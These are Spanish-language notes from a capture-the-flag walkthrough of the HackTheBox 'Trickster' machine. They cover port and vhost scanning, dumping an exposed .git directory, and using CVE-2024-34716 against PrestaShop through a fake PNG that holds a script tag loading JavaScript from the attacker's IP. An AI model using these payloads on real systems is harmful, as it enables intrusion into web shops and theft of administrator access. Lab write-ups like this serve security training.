
`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.34 -oG allPorts`
`nmap -p22,80 -sCV 10.10.11.34 -oN targeted`
```python
22/ssh
80/http
```


`gobuster vhost -u http://trickster.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -r --append-domain`
```js
10.10.11.34     trickster.htb shop.trickster.htb
```

Utiliza un `prestashop` que es como un Wordpress para ecomerce

Encontramos en `robots.txt` el directorio `http://shop.trickster.htb/.git/`

Usaremos la herramienta [[GITHACK]] `https://github.com/lijiejie/GitHack.git`
`python3 githack http://shop.trickster.htb/.git/`

Nos traerá toda la web a nuestra maquina y la podemos ver navegando a sus directorios
Encontramos el siguiente directorio de panel de login de Prestashop `http://shop.trickster.htb/admin634ewutrx1jgitlooaj/index.php`

Encontramos la versión y encontramos que tiene un CVE `CVE-2024-34716`
`https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/`

En el PoC nos explica que podemos crear un falso archivo `.png` en el cual podemos incluir contenido javascript que sera interpretado, por lo que se aconteceria un XXS
Este archivo se puede incluir en la web `http://shop.trickster.htb/contact-us`

Creamos el fichero `test.png` con el contenido `<script src="http://10.10.14.18/malicius.js"></script>`

El servicio web hace la solicitud al recurso que hemos levantado en el server de python